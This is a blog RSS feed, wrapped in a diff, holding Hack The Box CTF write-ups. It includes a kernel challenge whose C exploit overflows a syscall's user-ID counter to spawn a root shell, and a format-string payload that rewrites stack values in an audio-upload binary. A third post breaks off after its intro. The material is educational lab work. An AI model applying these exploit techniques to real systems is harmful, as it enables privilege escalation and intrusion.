@@ -1,0 +1,1867 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Htb on Kvn11</title><link>https://Kvn11.github.io/tags/htb/</link><description>Recent content in Htb on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Apr 2024 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/tags/htb/index.xml" rel="self" type="application/rss+xml"/><item><title>Kernel Adventures Part II</title><link>https://Kvn11.github.io/p/kernel-adventures-part-ii/</link><pubDate>Mon, 08 Apr 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/kernel-adventures-part-ii/</guid><description>&lt;img src="https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg" alt="Featured image of post Kernel Adventures Part II" />&lt;h2 id="setup">Setup
+&lt;/h2>&lt;p>WORK IN PROGRESS&amp;hellip;&lt;/p>
+&lt;p>This is the solution for HTB&amp;rsquo;s &lt;code>Kernel Adventures: Part II&lt;/code>, and in the process, we can learn and get an introduction to kernel exploitation.&lt;/p>
+&lt;p>After you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor.
+However, you may get an error during the &lt;code>git apply&lt;/code> command.
+To resolve these, you first need to run &lt;code>git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91&lt;/code> to revert the repo to the commit in which the vulnerability was introduced.
+Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.&lt;/p>
+&lt;h2 id="goals">Goals
+&lt;/h2>&lt;p>So I will take 2 approaches here.
+The first is to do a code review to find the vuln by hand (eyes).
+Then I want to build a fuzzer to automate the finding.&lt;/p>
+&lt;h2 id="finding-vulnerability">Finding Vulnerability
+&lt;/h2>&lt;p>So my first approach here is to look at the &lt;code>patch.diff&lt;/code> file to see what was changed.
+There was a folder &lt;code>magic/&lt;/code> that was added.
+Also, there is a new syscall &lt;code>magic&lt;/code> added to &lt;code>arch/x86/entry/syscalls/syscall_64.tbl&lt;/code>
+However, the &amp;ldquo;meat&amp;rdquo; of the challenge is in &lt;code>magic/magic.c&lt;/code>, which fleshes out the syscall.&lt;/p>
+&lt;p>Lets walkthrough what the new syscall does.
+First it will initialize itself via the &lt;code>do_init()&lt;/code> function, but only if the &lt;code>initialized&lt;/code> value is not 0.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">do_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">uid&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">CHILDLIST_SIZE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">magic_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nextId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initialized&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This function sets the default username and password to &lt;code>root:password&lt;/code>.
+It also defines a &lt;code>MagicUser*&lt;/code> called root.
+Then &lt;code>kzalloc&lt;/code> is called and the resulting pointer is assigned to &lt;code>root&lt;/code>.
+From my understanding, &lt;code>kzalloc&lt;/code> will allocate a chunk and initialize its memory to zero.
+An important thing to note here is that this allocation will need to be freed at some point.
+Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.&lt;/p>
+&lt;p>Now lets look at the individual actions we can get this syscall to perform.
+Lets start with adding a user with &lt;code>long do_add(char* username, char* password)&lt;/code>.
+First it checks if the user that will be added exists.
+This is done by just iterating over the list of users, and checking the username against the supplied username.
+Then an empty entry in the user list is found, which is where the new user will be added.
+This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned.
+Then a search for the current user is conducted, but this time by uuid.
+Again, this is just a simple for loop that compares uid, nothing special.
+Then it will locate an empty slot in the current users child list.
+Then another call to &lt;code>kzalloc&lt;/code> for the new user.
+And the next user is given the &lt;code>nextId&lt;/code> value, which will be +1 from the previous.
+We should note, that in no other function is there something to decrement the &lt;code>nextId&lt;/code> value, meaning it will always increase.
+Maybe we could just create new users until we overflow the &lt;code>uid&lt;/code> value to be 0 again?
+Seems possible, cuz &lt;code>nextId&lt;/code> is an unsigned short (2 bytes), so thats a total of &lt;code>0xFFFF&lt;/code> values.
+Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
+So if we get UUID 0, then we get the privileges of the root user.
+Here is my exploit.
+After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/syscall.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define MAGIC_SYS 449
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">long&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0xFFFFFFFF&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create the user
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uuid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">execve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete the user
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">musl-gcc -static -march&lt;span class="o">=&lt;/span>x86-64 -Os expl.c -o expl
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>HTB PWN Pixel Audio</title><link>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</link><pubDate>Sat, 30 Mar 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/hackthebox.jpg" alt="Featured image of post HTB PWN Pixel Audio" />&lt;h2 id="locating-vulnerability">Locating Vulnerability
+&lt;/h2>&lt;p>The challenge consists of a web server that allows a user to upload an mp3 file, and then plays that file.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1.png"
+width="1914"
+height="925"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Really cool pixel art"
+class="gallery-image"
+data-flex-grow="206"
+data-flex-basis="496px"
+>&lt;/p>
+&lt;p>Next, it is time to reverse engineer the application in binary ninja.
+The code is pretty straightforward, there is a check to see if the uploaded file is an mp3.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2.png"
+width="699"
+height="212"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Main function"
+class="gallery-image"
+data-flex-grow="329"
+data-flex-basis="791px"
+> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3.png"
+width="978"
+height="755"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="mp3 check"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="310px"
+>&lt;/p>
+&lt;p>In the mp3 check, there seems to be some &amp;ldquo;beta&amp;rdquo; functionality, which is where the code to reveal the flag is.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4.png"
+width="653"
+height="475"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Read flag"
+class="gallery-image"
+data-flex-grow="137"
+data-flex-basis="329px"
+>&lt;/p>
+&lt;p>We need to change two of the variables to different values in order to trigger the beta function.
+There are 2 &lt;code>freads&lt;/code> that occur in this function.
+Both read from the mp3 file we upload.
+The first one is a read of 3 bytes, which is meant to obtain the magic bytes of the file.
+The magic bytes need to be the string &lt;code>ID3&lt;/code>.&lt;/p>
+&lt;p>The second read is of size &lt;code>0x16&lt;/code> bytes, and is interesting because the read bytes are later printed via a &lt;code>printf&lt;/code> statement.
+This makes me think that we could do a write via a format string vulnerability.
+At this point, I don&amp;rsquo;t know if there is an overflow in any of the &lt;code>fread&lt;/code> calls, but we know that there is a pointer to the two values we need to change, which we can catch with a format string exploit, and then we can write a specific value to those addresses using a format string payload.
+The next step is to verify these vulnerabilities with a debugger.&lt;/p>
+&lt;h2 id="verifying-vulnerability">Verifying vulnerability
+&lt;/h2>&lt;p>I built a PoC payload using the correct magic bytes, and used a cyclic pattern of &lt;code>0x16&lt;/code> bytes incase there is an overflow.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5.png"
+width="639"
+height="98"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="First payload"
+class="gallery-image"
+data-flex-grow="652"
+data-flex-basis="1564px"
+>&lt;/p>
+&lt;p>Since we have a specific libc to use, we have to use the following command to run the binary:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc/libc.so.6 ./main
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Additionally the file is being called as &lt;code>/tmp/test.mp3&lt;/code> so we need to change the name and location of our PoC.&lt;/p>
+&lt;p>Behaviour is as expected, no obvious overflow since stack cookie fail was not triggered.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6.png"
+width="1282"
+height="140"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Def a format string challenge"
+class="gallery-image"
+data-flex-grow="915"
+data-flex-basis="2197px"
+>&lt;/p>
+&lt;p>Checking out a generic format string payload in GDB, I was also able to verify that there was no overflow.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7.png"
+width="492"
+height="174"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Format string vuln for sure"
+class="gallery-image"
+data-flex-grow="282"
+data-flex-basis="678px"
+>&lt;/p>
+&lt;p>The payload starts at &lt;code>0x7fffffffdbd0&lt;/code>, and isn&amp;rsquo;t enough to overwrite not even the stack cookie, which is at &lt;code>0x7fffffffdbe8&lt;/code>
+So at this point I am confident that this is just a format string vuln.
+I am able to get the pointers to the values that need to change by referencing the 12th and 13th values on the stack: &lt;code>%12$p.%13$p&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8.png"
+width="501"
+height="170"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="The two addresses we need to write to."
+class="gallery-image"
+data-flex-grow="294"
+data-flex-basis="707px"
+>&lt;/p>
+&lt;h2 id="exploit">Exploit
+&lt;/h2>&lt;p>Since we now know where to write, we can craft our write.
+The first write will be for 48879, and the second for 495.
+The reason for this is that the after the first write (48879 = &lt;code>beef&lt;/code>), then we need to subtract that write from the second (49374 = &lt;code>c0de&lt;/code>).
+So the payload becomes: &lt;code>ID3%48879x%12$n%495x%13$n&lt;/code>, which fits perfectly in our 22 byte restriction.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9.png"
+width="596"
+height="148"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Before printf"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="966px"
+> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10.png"
+width="612"
+height="146"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="After printf"
+class="gallery-image"
+data-flex-grow="419"
+data-flex-basis="1006px"
+>&lt;/p>
+&lt;p>And that works just fine:&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11.png"
+width="689"
+height="533"
+srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="310px"
+>&lt;/p></description></item><item><title>HTB Insane Web OOPArtDB</title><link>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</link><pubDate>Tue, 20 Feb 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox.jpg" alt="Featured image of post HTB Insane Web OOPArtDB" />&lt;h2 id="intro">Intro
+&lt;/h2>&lt;p>This challenge allows you to submit a URL to be &amp;ldquo;scanned&amp;rdquo; by a bot on the challenge server.
+The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the &amp;ldquo;Overseer&amp;rdquo; user.&lt;/p>
+&lt;h2 id="foothold">Foothold
+&lt;/h2>&lt;p>One of the first things I noticed in the source code, was the &lt;code>/debug&lt;/code> and &lt;code>/register&lt;/code> endpoint.
+The &lt;code>/debug&lt;/code> endpoint caught my attention because it could reveal the secret &lt;code>REFERRAL_TOKEN&lt;/code> value which is required to register via &lt;code>/register&lt;/code> as the higher privilege &lt;code>researcher&lt;/code> type of user.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
